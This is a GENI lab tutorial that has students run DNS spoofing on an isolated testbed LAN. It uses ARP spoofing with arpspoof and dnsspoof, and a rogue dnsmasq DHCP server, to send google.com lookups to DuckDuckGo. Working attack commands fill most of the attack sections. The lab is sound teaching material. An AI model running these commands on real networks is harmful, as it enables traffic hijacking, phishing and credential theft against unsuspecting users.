This is an experimental demonstration of two ways a malicious attacker might redirect traffic for a website to its own "fake" version of the site. Both methods involve DNS spoofing. In one version, the attacker will masquerade as the legitimate DHCP server for the LAN and instruct clients to use the attacker for name resolution. In the other the attacker will use ARP spoofing to impersonate the legitimate DNS server and answer name resolution queries in its place.

It should take about 60-120 minutes to run this experiment.

This experiment involves running a potentially disruptive application over a private network, in a way that does not affect infrastructure outside of your slice. Take special care not to use this application in ways that may adversely affect other infrastructure. Users of GENI are responsible for ensuring compliance with the [GENI Resource Recommended User Policy](http://groups.geni.net/geni/raw-attachment/wiki/RUP/RUP.pdf).


To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

* Skip to [Results](#results)
* Skip to [Run my experiment](#runmyexperiment)

## Background

DNS spoofing is a broad category of attacks in which a malicious attacker sends forged DNS responses.

A DNS server translates human-readable names like "google.com", into an IP address that applications need to connect to a remote resource (such as a website). When DNS responses are forged, the victim will (unknowingly) connect to a different host than the one it intended to reach. This kind of attack may be used in phishing attacks, to censor web traffic for some domains, to inject content such as advertisements into web traffic, or for other purposes.

One kind of DNS spoofing attack is illustrated below:

![](/blog/content/images/2016/07/dns-spoof-bad-1.svg)

There are many different ways to do DNS spoofing. In this experiment we'll try two of them: 

1. acting as a false DHCP server and lying to clients on the LAN about which DNS server to use, and 
2. mounting a man-in-the-middle attack and impersonating the real DNS server.


DNS spoofing is easiest when both the attacker and victim are on the same LAN. However, there are other (less reliable) DNS attacks that can feasibly be carried out even without access to the victim's LAN.


## Results

Here is an example of a normal DNS lookup which returns a correct address for google.com from the "good" server on the LAN:

<iframe width="420" height="315" src="https://www.youtube.com/embed/1ZdeiulDB9U" frameborder="0" allowfullscreen></iframe>

In the next example, we use ARP spoofing for the attacker to impersonate the DNS server, and respond to DNS queries with a wrong IP address. As a result, the client is redirected to DuckDuckGo when it tries to use Google:

<iframe width="420" height="315" src="https://www.youtube.com/embed/TJ4Inhd_cOM" frameborder="0" allowfullscreen></iframe>

Finally, we use a DHCP masquerade attack to similar effect. When the client looks for an IP address from DHCP, the attacker responds with an offer before the "good" server and is configured to be the client's nameserver. When the client tries to get an IP address for Google, the attacker returns the IP address for DuckDuckGo instead:

<iframe width="420" height="315" src="https://www.youtube.com/embed/RFcZiE4ygF8" frameborder="0" allowfullscreen></iframe>


## Run my experiment

First, reserve your resources.

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/dns\_spoofing\_request\_rspec.xml](https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/dns_spoofing_request_rspec.xml)

This should load the following topology onto your canvas:

![](/blog/content/images/2016/07/dns-spoof.png)

The RSpec also includes commands to install the necessary software (e.g. `dnsmasq` for DNS and DHCP service, an Apache web server, the `dsniff` package for ARP and DNS spoofing, etc.) on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources. 

Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready), and then wait another couple of minutes for the software installation to finish. 


### Normal DNS queries

First, we will show when happens when our client connects to a "good" DHCP+DNS server, and then tries to reach an external website. Open three terminal windows. On one, log in to the "client" node; on the other two, log in to the "good DHCP" server node.

On one of the server terminals, run

```
sudo service dnsmasq stop
sudo dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts -d
```

This sets up the `dnsmasq` server to act as a DHCP server, offering IP addresses in the range 10.10.1.20-10.10.1.50 to clients on the private LAN. It will also respond to DNS queries.


In the second server terminal window, run

```
sudo tcpdump -n -i eth1
```

to monitor traffic to and from the "good" server on the private LAN.

Then, on the client node, clear the current name resolution server information (it is currently using a DNS server on the GENI rack, not on our private experiment LAN):

```
# to prevent 'sudo' from complaining; see http://askubuntu.com/q/59458/
sudo hostname client 
sudo rm /etc/resolv.conf
```

and, on the client node, run

```
# release current IP address, if any
sudo dhclient -r eth1
# request IP address
sudo dhclient eth1
```

to request an IP address from DHCP over the private LAN. 

In the server terminal windows, you should see the DHCP request and response in both the `dnsmasq` and `tcpdump` windows. Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. This is what will enable our attacker to hijack DHCP on the LAN in the next steps of our experiment!

Now, we'll verify that the client is using our "good" server for name resolution. First, we'll test using the `nslookup` name resolution tool. On the client, run:

```
nslookup google.com
```

In the `tcpdump` output on the server, you should see the DNS query and response.

Finally, we'll visit `google.com` using a browser on our client, and verify that name lookup again. On the client, run

```
lynx http://google.com
```

and again, you should see the name lookup in the `tcpdump` output on the server. (Use `y` in the Lynx window to accept cookies; use `q` and then `y` again to quit Lynx when you're done.)

Now, will try two methods for DNS spoofing on a LAN:

1. The attacker uses ARP spoofing to impersonate the "good" DNS server, and responds to DNS queries for the targeted website before the "good" DNS server does. 
2. The attacker uses a DHCP masquerade attack to impersonate the "good" DHCP server, and tells the victim to use the attacker as a nameserver. Then it serves its own address in response to DNS queries for the targeted website.


Open another two terminal windows, and in both, log in to your "attacker" node.

### ARP spoofing

This attack works most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run

```
sudo tc qdisc del dev eth1 root
sudo tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
```

This procedure assumes that you have just completed the steps above, so that the client uses the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.


Check the client's ARP table to see what MAC address is currently associated with the server's IP address:

```
arp -a -i eth1
```

Next, we are going to use ARP spoofing to make the client believe we are the "good" server, and the server believe we are the client. On the attacker, run:


```
# Enable packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1
# get IP address of client from the "good" server
clientip=$(dig @10.10.1.2 +short client)
# two-way ARP spoofing: make client think we are
# the "good" server, make "good" server think we 
# are the client
sudo arpspoof -i eth1 -t "$clientip" 10.10.1.2 &
sudo arpspoof -i eth1 -t 10.10.1.2 "$clientip" &
```

You'll see the gratuitous ARP messages show up in the `tcpdump` process that's running on the "good" server.

On the client node, check the ARP table. You should see that what the client now believes that the "good" server's MAC address is actually the attackers' MAC address!

Finally, we're ready to offer up some bad name resolution. In a second terminal on the attacker, run

```
ddgip=$(dig +short duckduckgo.com | head -n 1)
echo "$ddgip google.com" > ~/badhosts
echo "$ddgip www.google.com" >> ~/badhosts

sudo dnsspoof -i eth1 -f badhosts
```

This command creates a file called `badhosts` with a list of IP address and hostname mappings that we will fool our client into believing. In this case, our attacker will make the client go to the DuckDuckGo search engine when he tries to visit Google. (The attacker _could_ potentially do much worse things, like returning its own IP address or that of a colluding server and then delivering malware or silently stealing credentials from the user from the web page it controls.) Then we use the `dnsspoof` tool to answer DNS queries for those hosts.


On the client, run

```
nslookup google.com
```

In the `tcpdump` output on the "good" server, you should still see the DNS query and response. But you should also see a query and response in the `dnsspoof` output on the attacker. Check the IP address returned from `nslookup` by opening it in a browser - do you see the Google search page, or DuckDuckGo's?

Finally, we'll visit `google.com` using a browser on our client, and verify that our attacker is forcing traffic for `google.com` to go to DuckDuckGo instead. On the client, run

```
lynx http://google.com
```

Do you see the Google home page, or DuckDuckGo's?

When you've verified the attack, use Ctrl+C to stop the `dnsspoof` process, and stop the ARP spoofing by running

```
sudo killall arpspoof
```

on the attacker.

### DHCP masquerade attack

In this version of the attack, the attacker will run its own DHCP server. When the client requests a new address from DHCP, it will get an offer from the attacker before the "good" server (because of the latency we will set up on the "good" server). As part of the DHCP response, the attacker will tell the client to use it for name resolution. Then, it can send malicious DNS responses.

This procedure assumes that you have already run the previous attack, and so you already have the `badhosts` file set up to redirect traffic for Google to DuckDuckGo. If you _don't_ have this, run the following on the attacker:

```
ddgip=$(dig +short duckduckgo.com | head -n 1)
echo "$ddgip google.com" > ~/badhosts
echo "$ddgip www.google.com" >> ~/badhosts
```

This attack works most reliably when packets from the attacker reaching the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run

```
sudo tc qdisc del dev eth1 root
sudo tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
```

and then you can start the `tcpdump` again. Also, the `dnsmasq` process should still be running on the "good" server.

Now, on the attacker, start a `dnsmasq` instance:

```
sudo service dnsmasq stop
sudo dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --addn-hosts=badhosts -d
```

Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there.

Now, on the client node, run

```
# release current IP address, if any
sudo dhclient -r eth1
# kill any dhclients that may be running already
sudo killall dhclient
# clear current IP address
sudo ifconfig eth1 0.0.0.0
# request IP address
sudo dhclient eth1
```

to ask for an IP address from DHCP over the private LAN. You should see offers from both `dnsmasq` instances - on the "good" server and on the attacker - in the terminal output. But only one server will then get a request from the client. On the client, check the actual IP now used with

```
ifconfig eth1
```

Also, on the client run

```
cat /etc/resolv.conf
```

to check which host it is using for name resolution. Is it the "good" server (10.10.1.2) or the attacker (10.10.1.254)?

Try resolving google.com on the client with 

```
nslookup google.com
```

and visiting it in the browser with

```
lynx http://google.com
```

Does this resolve to the Google home page, or to DuckDuckGo's?

This attack is not deterministic - if the "good" server's DHCP offer reaches the client before the attacker's, then it won't work. You may need to repeat this experiment a couple of times in order to see it in effect.

 
## Notes

When you have finished this experiment, delete your resources in the Portal to free them for other experimenters!

